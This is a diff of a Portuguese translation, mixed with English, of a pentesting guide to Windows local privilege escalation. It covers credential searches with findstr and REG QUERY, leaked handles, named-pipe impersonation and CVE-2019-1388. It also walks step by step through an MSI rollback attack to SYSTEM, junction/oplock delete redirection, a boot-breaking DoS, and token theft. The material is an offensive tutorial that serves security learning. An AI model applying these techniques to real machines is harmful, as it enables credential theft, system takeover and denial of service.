+As classes e interfaces COM são definidas no registro sob **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface**, respectivamente. Esse registro é criado pela fusão de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
 
-Dentro dos CLSIDs desse registro você pode encontrar a chave filha **InProcServer32**, que contém um **valor padrão** apontando para uma **DLL** e um valor chamado **ThreadingModel** que pode ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ou **Neutral** (Thread Neutral).
+Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).
 
 ![](<../../images/image (729).png>)
 
-Basicamente, se você puder **sobrescrever qualquer uma das DLLs** que serão executadas, você poderia **escalar privilégios** se essa DLL for executada por um usuário diferente.
+Basicamente, se você conseguir sobrescrever qualquer uma das DLLs que serão executadas, você pode escalar privilégios se essa DLL for executada por um usuário diferente.
 
-Para aprender como atacantes usam COM Hijacking como mecanismo de persistência, veja:
+Para aprender como atacantes usam o COM Hijacking como mecanismo de persistência, veja:
 
 
 {{#ref}}
 com-hijacking.md
 {{#endref}}
 
-### **Busca genérica de senhas em arquivos e no registro**
+### **Busca genérica por senhas em arquivos e no registro**
 
 **Pesquisar por conteúdo de arquivos**
 ```bash
@@ -1266,26 +1270,26 @@ cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
-**Pesquisar por um arquivo com um nome específico**
+**Procurar um arquivo com um determinado nome**
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 ```
-**Pesquisar o registro por nomes de chaves e senhas**
+**Pesquisar no registro por nomes de chaves e senhas**
 ```bash
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
-### Ferramentas que procuram por passwords
+### Ferramentas que procuram por senhas
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **é um msf** plugin. Criei este plugin para **executar automaticamente cada metasploit POST module que procura por credentials** dentro da vítima.\
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) procura automaticamente por todos os arquivos que contenham passwords mencionados nesta página.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) é outra ótima ferramenta para extrair passwords de um sistema.
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **é um plugin do msf**. Eu criei este plugin para **executar automaticamente todos os módulos POST do metasploit que procuram por credenciais** dentro da vítima.\
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automaticamente por todos os arquivos que contêm senhas mencionadas nesta página.\
+[**Lazagne**](https://github.com/AlessandroZ/LaZagne) é outra ótima ferramenta para extrair senhas de um sistema.
 
-A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) procura por **sessions**, **usernames** e **passwords** de várias ferramentas que salvam esses dados em texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
+A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca por **sessões**, **nomes de usuário** e **senhas** de várias ferramentas que salvam esses dados em texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
 ```bash
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
@@ -1294,20 +1298,20 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 ## Leaked Handlers
 
-Imagine que **um processo em execução como SYSTEM abre um novo processo** (`OpenProcess()`) com **full access**. O mesmo processo **também cria um novo processo** (`CreateProcess()`) **com low privileges mas herdando todos os open handles do processo principal**.\
-Então, se você tem **full access ao processo com privilégios baixos**, você pode pegar o **open handle para o processo privilegiado criado** com `OpenProcess()` e **injectar um shellcode**.\
-[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
-[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
+Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
+[Leia este exemplo para mais informações sobre **como detectar e explorar essa vulnerabilidade**.](leaked-handle-exploitation.md)\
+[Leia este **outro post para uma explicação mais completa sobre como testar e abusar de mais open handlers de processos e threads herdados com diferentes níveis de permissões (não apenas full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
 ## Named Pipe Client Impersonation
 
-Shared memory segments, referred to as **pipes**, permitem comunicação e transferência de dados entre processos.
+Segmentos de memória compartilhada, referidos como **pipes**, permitem comunicação entre processos e transferência de dados.
 
-O Windows fornece um recurso chamado **Named Pipes**, permitindo que processos não relacionados compartilhem dados, até mesmo através de redes diferentes. Isso se assemelha a uma arquitetura client/server, com papéis definidos como **named pipe server** e **named pipe client**.
+O Windows fornece um recurso chamado **Named Pipes**, permitindo que processos não relacionados compartilhem dados, até mesmo entre diferentes redes. Isso assemelha-se a uma arquitetura cliente/servidor, com papéis definidos como **named pipe server** e **named pipe client**.
 
-Quando dados são enviados por uma **client** através de um pipe, o **server** que criou o pipe tem a capacidade de **assumir a identidade** da **client**, caso possua os direitos **SeImpersonate** necessários. Identificar um **processo privilegiado** que se comunica via um pipe que você consegue mimetizar oferece a oportunidade de **obter privilégios mais altos** ao adotar a identidade desse processo quando ele interagir com o pipe que você criou. Para instruções sobre como executar tal ataque, guias úteis podem ser encontrados [**here**](named-pipe-client-impersonation.md) e [**here**](#from-high-integrity-to-system).
+Quando dados são enviados através de um pipe por um **cliente**, o **servidor** que criou o pipe tem a capacidade de **assumir a identidade** do **cliente**, desde que possua os direitos necessários **SeImpersonate**. Identificar um **processo privilegiado** que se comunica via um pipe que você pode imitar oferece a oportunidade de **obter privilégios mais altos** ao adotar a identidade desse processo assim que ele interagir com o pipe que você estabeleceu. Para instruções sobre como executar esse ataque, guias úteis podem ser encontrados [**here**](named-pipe-client-impersonation.md) e [**here**](#from-high-integrity-to-system).
 
-Também a seguinte ferramenta permite **interceptar uma comunicação de named pipe com uma ferramenta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e ver todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Além disso, a seguinte ferramenta permite **interceptar a comunicação de named pipe com uma ferramenta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e ver todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
 ## Misc
 
@@ -1317,7 +1321,7 @@ Confira a página **[https://filesec.io/](https://filesec.io/)**
 
 ### **Monitoring Command Lines for passwords**
 
-Ao obter um shell como um usuário, pode haver tarefas agendadas ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura as linhas de comando dos processos a cada dois segundos e compara o estado atual com o estado anterior, exibindo quaisquer diferenças.
+Ao obter um shell como um usuário, podem existir tarefas agendadas ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura as linhas de comando dos processos a cada dois segundos e compara o estado atual com o estado anterior, exibindo quaisquer diferenças.
 ```bash
 while($true)
 {
@@ -1329,9 +1333,9 @@ Compare-Object -ReferenceObject $process -DifferenceObject $process2
 ```
 ## Roubando senhas de processos
 
-## De usuário com poucos privilégios para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass
+## De usuário com privilégios reduzidos para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass
 
-Se você tem acesso à interface gráfica (via console ou RDP) e o UAC está ativado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário sem privilégios.
+Se você tem acesso à interface gráfica (via console ou RDP) e o UAC está habilitado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário sem privilégios.
 
 Isso torna possível escalar privilégios e contornar o UAC ao mesmo tempo usando a mesma vulnerabilidade. Além disso, não há necessidade de instalar nada e o binário usado durante o processo é assinado e emitido pela Microsoft.
 
@@ -1357,7 +1361,7 @@ Windows 10 1607	14393	** link OPENED AS SYSTEM **
 Windows 10 1703	15063	link NOT opened
 Windows 10 1709	16299	link NOT opened
 ```
-Para explorar essa vulnerabilidade, é necessário realizar os seguintes passos:
+Para explorar esta vulnerabilidade, é necessário executar os seguintes passos:
 ```
 1) Right click on the HHUPD.EXE file and run it as Administrator.
 
@@ -1375,20 +1379,20 @@ Para explorar essa vulnerabilidade, é necessário realizar os seguintes passos:
 
 8) Remember to cancel setup and the UAC prompt to return to your desktop.
 ```
-You have all the necessary files and information in the following GitHub repository:
+Você tem todos os arquivos e informações necessárias no seguinte repositório GitHub:
 
 https://github.com/jas502n/CVE-2019-1388
 
 ## From Administrator Medium to High Integrity Level / UAC Bypass
 
-Read this to **learn about Integrity Levels**:
+Leia isto para **aprender sobre Níveis de Integridade**:
 
 
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
-Then **read this to learn about UAC and UAC bypasses:**
+Então **leia isto para aprender sobre UAC e bypasses do UAC:**
 
 
 {{#ref}}
@@ -1397,98 +1401,98 @@ Then **read this to learn about UAC and UAC bypasses:**
 
 ## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP
 
-The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).
+A técnica descrita [**neste post do blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) com um código de exploit [**disponível aqui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).
 
-The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.
+O ataque basicamente consiste em abusar do recurso de rollback do Windows Installer para substituir arquivos legítimos por maliciosos durante o processo de desinstalação. Para isso o atacante precisa criar um **malicious MSI installer** que será usado para sequestrar a pasta `C:\Config.Msi`, a qual depois será usada pelo Windows Installer para armazenar arquivos de rollback durante a desinstalação de outros pacotes MSI, onde os arquivos de rollback teriam sido modificados para conter o payload malicioso.
 
-The summarized technique is the following:
+A técnica resumida é a seguinte:
 
 1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**
 
 - Step 1: Install the MSI
-- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
-- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
-- Keep a **handle** open to the file after install.
+- Crie um `.msi` que instale um arquivo inofensivo (por exemplo, `dummy.txt`) em uma pasta gravável (`TARGETDIR`).
+- Marque o instalador como **"UAC Compliant"**, assim um **usuário não-admin** pode executá‑lo.
+- Mantenha um **handle** aberto para o arquivo após a instalação.
 
 - Step 2: Begin Uninstall
-- Uninstall the same `.msi`.
-- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
-- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.
+- Desinstale o mesmo `.msi`.
+- O processo de desinstalação começa a mover arquivos para `C:\Config.Msi` e renomeá‑los para arquivos `.rbf` (backups de rollback).
+- **Poll the open file handle** usando `GetFinalPathNameByHandle` para detectar quando o arquivo se torna `C:\Config.Msi\<random>.rbf`.
 
 - Step 3: Custom Syncing
-- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
-- Signals when `.rbf` has been written.
-- Then **waits** on another event before continuing the uninstall.
+- O `.msi` inclui uma **custom uninstall action (`SyncOnRbfWritten`)** que:
+- Sinaliza quando o `.rbf` foi escrito.
+- Então **espera** por outro evento antes de continuar a desinstalação.
 
 - Step 4: Block Deletion of `.rbf`
-- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
-- Then **signal back** so the uninstall can finish.
-- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.
+- Quando sinalizado, **abra o arquivo `.rbf`** sem `FILE_SHARE_DELETE` — isso **impede que ele seja deletado**.
+- Então **sinalize de volta** para que a desinstalação possa terminar.
+- O Windows Installer não consegue deletar o `.rbf`, e como não consegue deletar todo o conteúdo, **`C:\Config.Msi` não é removido**.
 
 - Step 5: Manually Delete `.rbf`
-- You (attacker) delete the `.rbf` file manually.
-- Now **`C:\Config.Msi` is empty**, ready to be hijacked.
+- Você (atacante) deleta o arquivo `.rbf` manualmente.
+- Agora **`C:\Config.Msi` está vazio**, pronto para ser sequestrado.
 
-> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.
+> Nesse ponto, **ative a vulnerabilidade de deletion arbitrária de pasta em nível SYSTEM** para deletar `C:\Config.Msi`.
 
 2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**
 
 - Step 6: Recreate `C:\Config.Msi` with Weak ACLs
-- Recreate the `C:\Config.Msi` folder yourself.
-- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.
+- Recrie a pasta `C:\Config.Msi` você mesmo.
+- Defina **DACLs fracas** (por exemplo, Everyone:F), e **mantenha um handle aberto** com `WRITE_DAC`.
 
 - Step 7: Run Another Install
-- Install the `.msi` again, with:
-- `TARGETDIR`: Writable location.
-- `ERROROUT`: A variable that triggers a forced failure.
-- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.
+- Instale o `.msi` novamente, com:
+- `TARGETDIR`: Local gravável.
+- `ERROROUT`: Uma variável que provoca uma falha forçada.
+- Essa instalação será usada para disparar o **rollback** novamente, que lê `.rbs` e `.rbf`.
 
 - Step 8: Monitor for `.rbs`
-- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
-- Capture its filename.
+- Use `ReadDirectoryChangesW` para monitorar `C:\Config.Msi` até que um novo `.rbs` apareça.
+- Capture seu nome de arquivo.
 
 - Step 9: Sync Before Rollback
-- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
-- Signals an event when the `.rbs` is created.
-- Then **waits** before continuing.
+- O `.msi` contém uma **custom install action (`SyncBeforeRollback`)** que:
+- Sinaliza um evento quando o `.rbs` é criado.
+- Então **espera** antes de continuar.
 
 - Step 10: Reapply Weak ACL
-- After receiving the `.rbs created` event:
-- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
-- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.
+- Após receber o evento ` .rbs created`:
+- O Windows Installer **reaplica ACLs fortes** para `C:\Config.Msi`.
+- Mas como você ainda tem um handle com `WRITE_DAC`, você pode **reaplicar ACLs fracas** novamente.
 
-> ACLs are **only enforced on handle open**, so you can still write to the folder.
+> ACLs são **aplicadas apenas quando o handle é aberto**, então você ainda pode escrever na pasta.
 
 - Step 11: Drop Fake `.rbs` and `.rbf`
-- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
-- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
-- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.
+- Sobrescreva o arquivo `.rbs` com um **fake rollback script** que instrui o Windows a:
+- Restaurar seu `.rbf` (malicious DLL) em um **local privilegiado** (por exemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
+- Depositar seu fake `.rbf` contendo uma **malicious SYSTEM-level payload DLL**.
 
 - Step 12: Trigger the Rollback
-- Signal the sync event so the installer resumes.
-- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
-- This causes **rollback to begin**.
+- Sinalize o evento de sincronização para que o instalador retome.
+- Uma **type 19 custom action (`ErrorOut`)** é configurada para **falhar intencionalmente a instalação** em um ponto conhecido.
+- Isso faz com que o **rollback seja iniciado**.
 
 - Step 13: SYSTEM Installs Your DLL
-- Windows Installer:
-- Reads your malicious `.rbs`.
-- Copies your `.rbf` DLL into the target location.
-- You now have your **malicious DLL in a SYSTEM-loaded path**.
+- O Windows Installer:
+- Lê seu `.rbs` malicioso.
+- Copia seu `.rbf` DLL para o local de destino.
+- Agora você tem sua **malicious DLL em um caminho carregado pelo SYSTEM**.
 
 - Final Step: Execute SYSTEM Code
-- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
-- **Boom**: Your code is executed **as SYSTEM**.
+- Execute um binário confiável **auto-elevado** (por exemplo, `osk.exe`) que carrega a DLL que você sequestrou.
+- **Boom**: Seu código é executado **como SYSTEM**.
 
 
 ### From Arbitrary File Delete/Move/Rename to SYSTEM EoP
 
-The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?
+A técnica principal de rollback do MSI (a anterior) assume que você pode deletar uma **pasta inteira** (por exemplo, `C:\Config.Msi`). Mas e se sua vulnerabilidade só permitir **deleção arbitrária de arquivos**?
 
-You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
+Você poderia explorar os **internos do NTFS**: toda pasta tem um fluxo de dados alternativo oculto chamado:
 ```
 C:\SomeFolder::$INDEX_ALLOCATION
 ```
-This stream armazena os **metadados de índice** da pasta.
+Este stream armazena os **metadados de índice** da pasta.
 
 Portanto, se você **excluir o stream `::$INDEX_ALLOCATION`** de uma pasta, o NTFS **remove a pasta inteira** do sistema de arquivos.
 
@@ -1496,27 +1500,27 @@ Você pode fazer isso usando APIs padrão de exclusão de arquivos como:
 ```c
 DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
 ```
-> Mesmo que você esteja chamando uma API de exclusão de *file*, ela **exclui a própria pasta**.
+> Mesmo que você esteja chamando uma API de exclusão de *arquivo*, ela **exclui a própria pasta**.
 
-### De Folder Contents Delete para SYSTEM EoP
-E se sua primitiva não permitir que você exclua arquivos/pastas arbitrários, mas ela **permitir a exclusão do *contents* de uma pasta controlada pelo atacante**?
+### From Folder Contents Delete to SYSTEM EoP
+What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the *contents* of an attacker-controlled folder**?
 
-1. Passo 1: Crie uma pasta de isca e um arquivo
+1. Passo 1: Crie uma pasta isca e um arquivo
 - Crie: `C:\temp\folder1`
 - Dentro dela: `C:\temp\folder1\file1.txt`
 
 2. Passo 2: Coloque um **oplock** em `file1.txt`
-- O oplock **pausa a execução** quando um processo privilegiado tenta excluir `file1.txt`.
+- O **oplock** **pausa a execução** quando um processo privilegiado tenta excluir `file1.txt`.
 ```c
 // pseudo-code
 RequestOplock("C:\\temp\\folder1\\file1.txt");
 WaitForDeleteToTriggerOplock();
 ```
-3. Passo 3: Acionar o processo SYSTEM (por exemplo, `SilentCleanup`)
-- Esse processo verifica pastas (por exemplo, `%TEMP%`) e tenta excluir o conteúdo delas.
-- Quando atingir `file1.txt`, o **oplock triggers** e entrega o controle ao seu callback.
+3. Etapa 3: Acionar o processo SYSTEM (por exemplo, `SilentCleanup`)
+- Esse processo varre pastas (por exemplo, `%TEMP%`) e tenta excluir seu conteúdo.
+- Quando chegar em `file1.txt`, o **oplock é acionado** e passa o controle para seu callback.
 
-4. Passo 4: Dentro do oplock callback – redirecionar a exclusão
+4. Etapa 4: Dentro do callback do oplock – redirecionar a exclusão
 
 - Opção A: Mover `file1.txt` para outro local
 - Isso esvazia `folder1` sem quebrar o oplock.
@@ -1532,68 +1536,68 @@ mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
 # Make file1.txt point to a sensitive folder stream
 CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
 ```
-> Isso tem como alvo o stream interno do NTFS que armazena metadados da pasta — apagá-lo apaga a pasta.
+> Isso mira o stream interno do NTFS que armazena metadados da pasta — excluí-lo exclui a pasta.
 
 5. Passo 5: Liberar o oplock
-- O processo SYSTEM continua e tenta apagar `file1.txt`.
-- Mas agora, devido à junction + symlink, ele está na verdade apagando:
+- O processo SYSTEM continua e tenta excluir `file1.txt`.
+- Mas agora, devido à junction + symlink, na verdade está excluindo:
 ```
 C:\Config.Msi::$INDEX_ALLOCATION
 ```
 **Resultado**: `C:\Config.Msi` é excluído pelo SYSTEM.
 
-### De criação arbitrária de pastas para DoS permanente
+### De criação arbitrária de pasta para DoS permanente
 
-Aproveite uma primitiva que permite que você crie uma pasta arbitrária como **SYSTEM/admin** — mesmo se você não puder gravar arquivos ou definir permissões fracas.
+Exploit uma primitiva que permite que você **crie uma pasta arbitrária como SYSTEM/admin** — mesmo se **você não puder gravar arquivos** ou **definir permissões fracas**.
 
-Crie uma **pasta** (não um arquivo) com o nome de um **critical Windows driver**, por exemplo:
+Crie uma **pasta** (não um arquivo) com o nome de um **driver crítico do Windows**, por exemplo:
 ```
 C:\Windows\System32\cng.sys
 ```
 - Este caminho normalmente corresponde ao driver em modo kernel `cng.sys`.
-- Se você o criar previamente como uma pasta, o Windows falha ao carregar o driver real na inicialização.
+- Se você **pré-criar o caminho como uma pasta**, o Windows falha ao carregar o driver real durante a inicialização.
 - Então, o Windows tenta carregar `cng.sys` durante a inicialização.
-- Ele vê a pasta, **falha em resolver o driver real**, e **trava ou interrompe a inicialização**.
-- Não há **fallback**, e **nenhuma recuperação** sem intervenção externa (por exemplo, reparo da inicialização ou acesso ao disco).
+- Ele vê a pasta, **não consegue resolver o driver real**, e **trava ou interrompe a inicialização**.
+- Não há **no fallback**, e **no recovery** sem intervenção externa (por exemplo, reparo de boot ou acesso ao disco).
 
 
 ## **From High Integrity to System**
 
-### **New service**
+### **Novo serviço**
 
-Se você já está executando em um processo High Integrity, o **caminho para SYSTEM** pode ser fácil apenas **criando e executando um novo serviço**:
+Se você já está executando em um processo High Integrity, o **path to SYSTEM** pode ser fácil apenas **criando e executando um novo serviço**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 > [!TIP]
-> Ao criar um binário de serviço, certifique-se de que é um serviço válido ou que o binário executa as ações necessárias rapidamente, pois será encerrado em 20s se não for um serviço válido.
+> Ao criar um binário de serviço certifique-se de que é um serviço válido ou que o binário execute as ações necessárias rapidamente, pois será encerrado em 20s se não for um serviço válido.
 
 ### AlwaysInstallElevated
 
 From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
-[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)
+[Mais informações sobre as chaves de registro envolvidas e como instalar um pacote _.msi_ aqui.](#alwaysinstallelevated)
 
 ### High + SeImpersonate privilege to System
 
-**Você pode** [**find the code here**](seimpersonate-from-high-to-system.md)**.**
+**Você pode** [**encontrar o código aqui**](seimpersonate-from-high-to-system.md)**.**
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
-If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
-Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
-**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**
+Se você tiver esses privilégios de token (provavelmente os encontrará em um processo já High Integrity), você poderá **abrir quase qualquer processo** (processos não protegidos) com o privilégio SeDebug, **copiar o token** do processo e criar um **processo arbitrário com esse token**.\
+Ao usar esta técnica normalmente **seleciona-se qualquer processo em execução como SYSTEM com todos os privilégios de token** (_sim, você pode encontrar processos SYSTEM sem todos os privilégios de token_).\
+**Você pode encontrar um** [**exemplo de código executando a técnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
-If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
-If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).
+This technique is used by meterpreter to escalate in `getsystem`. A técnica consiste em **criar um pipe e então criar/abusar de um service para escrever nesse pipe**. Então, o **server** que criou o pipe usando o privilégio **`SeImpersonate`** será capaz de **impersonar o token** do cliente do pipe (o serviço) obtendo privilégios SYSTEM.\
+Se você quiser [**aprender mais sobre name pipes você deve ler isto**](#named-pipe-client-impersonation).\
+Se quiser ler um exemplo de [**como ir de high integrity para System usando name pipes você deve ler isto**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-Se você conseguir **hijack uma dll** sendo **loaded** por um **process** executando como **SYSTEM**, você conseguirá executar código arbitrário com essas permissões. Portanto, Dll Hijacking também é útil para esse tipo de escalonamento de privilégios e, além disso, é muito **mais fácil de conseguir a partir de um High Integrity process** já que ele terá **write permissions** nas pastas usadas para carregar dlls.\
-**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**
+Se você conseguir **hijackar uma dll** que esteja sendo **carregada** por um **processo** em execução como **SYSTEM** você será capaz de executar código arbitrário com essas permissões. Portanto Dll Hijacking também é útil para esse tipo de escalonamento de privilégios e, além disso, é muito **mais fácil de alcançar a partir de um processo de high integrity**, pois este terá **permissões de escrita** nas pastas usadas para carregar dlls.\
+**Você pode** [**aprender mais sobre Dll hijacking aqui**](dll-hijacking/index.html)**.**
 
 ### **From Administrator or Network Service to System**
 
@@ -1603,7 +1607,7 @@ Se você conseguir **hijack uma dll** sendo **loaded** por um **process** execut
 
 ### From LOCAL SERVICE or NETWORK SERVICE to full privs
 
-**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
+**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
 ## Mais ajuda
 
@@ -1611,30 +1615,30 @@ Se você conseguir **hijack uma dll** sendo **loaded** por um **process** execut
 
 ## Ferramentas úteis
 
-**Melhor ferramenta para procurar vetores de escalonamento de privilégios locais no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica misconfigurações e arquivos sensíveis (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica por misconfigurações e arquivos sensíveis (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
 [**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica algumas possíveis misconfigurações e coleta informações (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
-[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica misconfigurações**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessão salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough localmente.**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai credenciais do Credential Manager. Detectado.**\
-[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Faz spray com senhas coletadas pelo domínio**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é uma ferramenta PowerShell de spoofing ADIDNS/LLMNR/mDNS/NBNS e man-in-the-middle.**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica de privesc no Windows**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Procura por vulnerabilidades de privesc conhecidas (DEPRECATED for Watson)\
+[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica por misconfigurações**\
